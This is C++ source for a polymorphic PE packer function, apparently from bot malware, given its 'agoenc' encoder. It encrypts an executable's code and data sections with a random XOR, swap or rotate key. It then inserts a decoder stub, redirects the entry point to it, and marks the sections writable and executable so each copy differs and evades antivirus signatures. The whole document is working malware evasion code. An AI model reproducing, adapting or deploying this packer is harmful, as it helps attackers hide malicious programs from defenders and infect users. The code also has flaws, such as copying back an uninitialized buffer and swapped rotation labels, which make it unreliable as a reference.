bool CPolymorph::DoPolymorph(const char *szFile, const char *szOutFile) {
  // Map the file into memory
  char *szBuffer;
  if(!MapFile(szFile, &szBuffer)) return false;
  // Get and check the DOS header
  IMAGE_DOS_HEADER *iDosHeader=(IMAGE_DOS_HEADER*)szBuffer;
  if(iDosHeader->e_magic!=IMAGE_DOS_SIGNATURE) {
    UnmapFile(); return false; }
  // Get and check the PE header
  char *pTemp=(char*)iDosHeader+iDosHeader->e_lfanew;
  DWORD *dwSignature=(DWORD*)pTemp;
  pTemp+=sizeof(DWORD);
  if(*dwSignature!=IMAGE_NT_SIGNATURE) {
    UnmapFile(); return false; }
  // Get the rest of the headers
  IMAGE_FILE_HEADER *iFileHead=(IMAGE_FILE_HEADER*)pTemp;
  pTemp+=sizeof(IMAGE_FILE_HEADER);
  IMAGE_OPTIONAL_HEADER *iOptHead=(IMAGE_OPTIONAL_HEADER*)pTemp;
  pTemp+=sizeof(IMAGE_OPTIONAL_HEADER);
  IMAGE_SECTION_HEADER *iSectHead=(IMAGE_SECTION_HEADER*)pTemp;
  // Get the size of the encoder
  int iEncoderSize=sizeof(agoenc);
  // Loop through the section headers
  int iSection;
  IMAGE_SECTION_HEADER *iSectPtr, *iSectEnc=NULL, *iSectCode=NULL, *iSectData=NULL;
  for(iSection=0, iSectPtr=iSectHead;
          iSection<iFileHead->NumberOfSections;
          iSection++, iSectPtr++) {
    // Check if its g_szSectionName (the internal section where
    // the encoder is stored).
    if(strstr((char*)iSectPtr->Name, g_szSectionName)) {
      // Store encoder in this section
      if(iSectPtr->SizeOfRawData >= iEncoderSize)
        iSectEnc=iSectPtr;
    }
    // Check if its the code section
    if(strstr((char*)iSectPtr->Name, ".text")) {
      // Mark this as the code section
      iSectCode=iSectPtr;
    }
    // Check if its the data section
    if(strstr((char*)iSectPtr->Name, ".data")) {
      // Mark this as the data section
      iSectData=iSectPtr;
    }
  }
  // The .exe file is already encrypted
  while(iFileHead->TimeDateStamp==0xFFFFFFFF) {
    // Get values out of the header
    char *pSectionData=(char*)szBuffer+iSectEnc->PointerToRawData;
    int iSectionSize=iSectEnc->SizeOfRawData;
    // Get the key
    unsigned long lKey, lType, lEntry;
    memcpy(&lKey, szBuffer+iSectEnc->PointerToRawData+ENC_OFFSET_KEY,
           sizeof(unsigned long));
    memcpy(&lType, szBuffer+iSectEnc->PointerToRawData+ENC_OFFSET_TYPE,
           sizeof(unsigned long));
    memcpy(&lEntry, szBuffer+iSectEnc->PointerToRawData+ENC_OFFSET_ENTRYPOINT,
           sizeof(unsigned long));

    // Allocate memory for the new section data
    char *pNewSectionData=(char*)malloc(iSectionSize+1);
    if(!pNewSectionData) break;

    // DeXOR the code section
    unsigned char *pCodeData=
      (unsigned char*)szBuffer+iSectCode->PointerToRawData;
    switch(lType)
    {
    case POLY_TYPE_XOR:
    {   // XOR to decrypt
      for(int i=0; i<iSectCode->SizeOfRawData; i+=4)
        *(unsigned long*)(pCodeData+i)^=lKey;
    }
    break;
    case POLY_TYPE_SWAP:
    {   // SWAP to decrypt
      for(int i=0; i<iSectCode->SizeOfRawData; i+=4)
      {   unsigned short word1=*(unsigned short*)(pCodeData+i);
        unsigned short word2=*(unsigned short*)(pCodeData+i+2);
        *(unsigned short*)(pCodeData+i)=word2;
        *(unsigned short*)(pCodeData+i+2)=word1;
      }
    }
    break;
    case POLY_TYPE_ROR:
    {   // ROL to decrypt
      for(int i=0; i<iSectCode->SizeOfRawData; i+=4)
      {   unsigned long lInput=*(unsigned long*)(pCodeData+i);
        *(unsigned long*)(pCodeData+i)=(lInput<<1)|(lInput>>31);
      }
    }
    break;
    case POLY_TYPE_ROL:
    {   // ROR to decrypt
      for(int i=0; i<iSectCode->SizeOfRawData; i+=4)
      {   unsigned long lInput=*(unsigned long*)(pCodeData+i);
        *(unsigned long*)(pCodeData+i)=(lInput>>1)|(lInput<<31);
      }
    }
    break;
    default: break;
    };

    // DeXOR the data section
    unsigned char *pDataData=
      (unsigned char*)szBuffer+iSectData->PointerToRawData;

    switch(lType)
    {
    case POLY_TYPE_XOR:
    {   // XOR to decrypt
      for(int i=0; i<iSectData->SizeOfRawData; i+=4)
        *(unsigned long*)(pDataData+i)^=lKey;
    }
    break;
    case POLY_TYPE_SWAP:
    {   // SWAP to decrypt
      for(int i=0; i<iSectData->SizeOfRawData; i+=4)
      {   unsigned short word1=*(unsigned short*)(pDataData+i);
        unsigned short word2=*(unsigned short*)(pDataData+i+2);
        *(unsigned short*)(pDataData+i)=word2;
        *(unsigned short*)(pDataData+i+2)=word1;
      }
    }
    break;
    case POLY_TYPE_ROR:
    {   // ROL to decrypt
      for(int i=0; i<iSectData->SizeOfRawData; i+=4)
      {   unsigned long lInput=*(unsigned long*)(pDataData+i);
        *(unsigned long*)(pDataData+i)=(lInput<<1)|(lInput>>31);
      }
    }
    break;
    case POLY_TYPE_ROL:
    {   // ROR to decrypt
      for(int i=0; i<iSectData->SizeOfRawData; i+=4)
      {   unsigned long lInput=*(unsigned long*)(pDataData+i);
        *(unsigned long*)(pDataData+i)=(lInput>>1)|(lInput<<31);
      }
    }
    break;
    default:
      break;
    };
    // Set the entry point to the old entry
    memcpy(&iOptHead->AddressOfEntryPoint, &lEntry, sizeof(lEntry));
    // Copy the section data into the image
    memcpy(pSectionData, pNewSectionData, iSectionSize);
    free(pNewSectionData);
    break;
  }
  // Found an encoder-suitable section
  while(iSectEnc && iSectCode && iSectData) {
    // Get values out of the header
    char *pSectionData=(char*)szBuffer+iSectEnc->PointerToRawData;
    int iSectionSize=iSectEnc->SizeOfRawData;
    // Get a key
    init_random();
    unsigned long lKey;
    *((char*)&lKey+0)=brandom(1,254);
    *((char*)&lKey+1)=brandom(1,254);
    *((char*)&lKey+2)=brandom(1,254);
    *((char*)&lKey+3)=brandom(1,254);


    // Get a type
    unsigned long lType=brandom(1,POLY_NUM_TYPES);

    // Set some marker for encryption detection later
    iFileHead->TimeDateStamp=0xFFFFFFFF;

    // Allocate memory for the new section data
    char *pNewSectionData=(char*)malloc(iSectionSize+1);
    if(!pNewSectionData) break;

    // Build an encoder in the section data
    BuildEncoder(pNewSectionData, iSectionSize, iSectEnc->VirtualAddress, \
           iSectCode->VirtualAddress, iSectCode->SizeOfRawData, \
           iSectData->VirtualAddress, iSectData->SizeOfRawData, \
           iOptHead->AddressOfEntryPoint, lKey, lType);

    // Set the entry point to the virtual address of the encoder section
    memcpy(&iOptHead->AddressOfEntryPoint, &iSectEnc->VirtualAddress, \
         sizeof(iSectEnc->VirtualAddress));

    // Make the encoder section readable, writable, executable,
    // and containing code
    iSectEnc->Characteristics = IMAGE_SCN_MEM_EXECUTE |
                  IMAGE_SCN_MEM_READ |
                  IMAGE_SCN_MEM_WRITE |
                  IMAGE_SCN_CNT_CODE;

    // Make the code section readable, writable, executable,
    // and containing code
    iSectCode->Characteristics  = IMAGE_SCN_MEM_EXECUTE |
                    IMAGE_SCN_MEM_READ |
                    IMAGE_SCN_MEM_WRITE |
                    IMAGE_SCN_CNT_CODE;

    // Make the data section readable, writable and containing inited data
    iSectData->Characteristics  = IMAGE_SCN_MEM_READ |
                    IMAGE_SCN_MEM_WRITE |
                    IMAGE_SCN_CNT_INITIALIZED_DATA;

    // XOR the code section
    unsigned char *pCodeData=
      (unsigned char*)szBuffer+iSectCode->PointerToRawData;

    switch(lType)
    {
    case POLY_TYPE_XOR:
    {
      // XOR to encrypt
      for(int i=0; i<iSectCode->SizeOfRawData; i+=4)
        *(unsigned long*)(pCodeData+i)^=lKey;
    }
    break;
    case POLY_TYPE_SWAP:
    {
      // SWAP to encrypt
      for(int i=0; i<iSectCode->SizeOfRawData; i+=4)
      {   unsigned short word1=*(unsigned short*)(pCodeData+i);
        unsigned short word2=*(unsigned short*)(pCodeData+i+2);
        *(unsigned short*)(pCodeData+i)=word2;
        *(unsigned short*)(pCodeData+i+2)=word1;
      }
    }
    break;
    case POLY_TYPE_ROR:
    {
      // ROR to encrypt
      for(int i=0; i<iSectCode->SizeOfRawData; i+=4)
      {   unsigned long lInput=*(unsigned long*)(pCodeData+i);
        *(unsigned long*)(pCodeData+i)=(lInput>>1)|(lInput<<31);
      }
    }
    break;
    case POLY_TYPE_ROL:
    {
      // ROL to encrypt
      for(int i=0; i<iSectCode->SizeOfRawData; i+=4)
      {   unsigned long lInput=*(unsigned long*)(pCodeData+i);
        *(unsigned long*)(pCodeData+i)=(lInput<<1)|(lInput>>31);
      }
    }
    break;
    default:
      break;
    };

    // XOR the data section
    unsigned char *pDataData=
      (unsigned char*)szBuffer+iSectData->PointerToRawData;

    switch(lType)
    {
    case POLY_TYPE_XOR:
    {
      // XOR to encrypt
      for(int i=0; i<iSectData->SizeOfRawData; i+=4)
        *(unsigned long*)(pDataData+i)^=lKey;
    }
    break;
    case POLY_TYPE_SWAP:
    {
      // SWAP to encrypt
      for(int i=0; i<iSectData->SizeOfRawData; i+=4)
      {   unsigned short word1=*(unsigned short*)(pDataData+i);
        unsigned short word2=*(unsigned short*)(pDataData+i+2);
        *(unsigned short*)(pDataData+i)=word2;
        *(unsigned short*)(pDataData+i+2)=word1;
      }
    }
    break;
    case POLY_TYPE_ROR:
    {
      // ROR to encrypt
      for(int i=0; i<iSectData->SizeOfRawData; i+=4)
      {   unsigned long lInput=*(unsigned long*)(pDataData+i);
        *(unsigned long*)(pDataData+i)=(lInput>>1)|(lInput<<31);
      }
    }
    break;
    case POLY_TYPE_ROL:
    {
      // ROL to encrypt
      for(int i=0; i<iSectData->SizeOfRawData; i+=4)
      {   unsigned long lInput=*(unsigned long*)(pDataData+i);
        *(unsigned long*)(pDataData+i)=(lInput<<1)|(lInput>>31);
      }
    }
    break;
    default:
      break;
    };
    // Copy the section data into the image
    memcpy(pSectionData, pNewSectionData, iSectionSize);
    free(pNewSectionData);
    break;
  }
  // Save the file under a new filename and unmap it
  SaveFile(szOutFile); UnmapFile();
  return true;
}
